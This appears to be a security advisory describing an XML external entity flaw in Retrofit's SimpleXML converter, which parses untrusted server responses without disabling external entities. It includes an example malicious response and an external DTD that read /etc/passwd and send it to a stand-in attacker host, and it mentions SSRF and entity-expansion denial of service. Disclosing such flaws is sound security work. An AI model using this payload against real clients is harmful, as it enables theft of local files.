title: XML External Entity (XXE) Injection in SimpleXML Converter Factory
analysis:
The `SimpleXmlConverterFactory` utilizes `org.simpleframework.xml.core.Persister` as its default serializer (or can be configured with one). By default, SimpleXML's `Persister` handles XML deserialization without disabling DTDs or external entity resolution. 

When a Retrofit client uses `SimpleXmlConverterFactory` to communicate with a remote server, a compromised or malicious server can return a crafted XML response that includes external entity definitions or entity expansions. When `SimpleXmlResponseBodyConverter.convert` processes this untrusted response body via `serializer.read(cls, value.charStream(), strict)`, the parser resolves these external entities.

An attacker can exploit this XML External Entity (XXE) vulnerability to perform local file disclosure, launch SSRF attacks against internal network resources, or cause a denial of service (DoS) using XML entity expansion (the Billion Laughs attack).

### Conceptual Exploit Payload (File Disclosure via XXE)
An attacker-controlled server can return the following malicious XML payload in response to a Retrofit request:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [  
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %exfiltrate;
]>
<my-object>
  <message>&exfil;</message>
  <count>10</count>
</my-object>
```

Where the external DTD hosted at `http://attacker.com/evil.dtd` contains:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfiltrate "<!ENTITY % exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

When parsed by the vulnerable `SimpleXmlResponseBodyConverter`, the client parses `/etc/passwd` and exfiltrates its content to `attacker.com`.
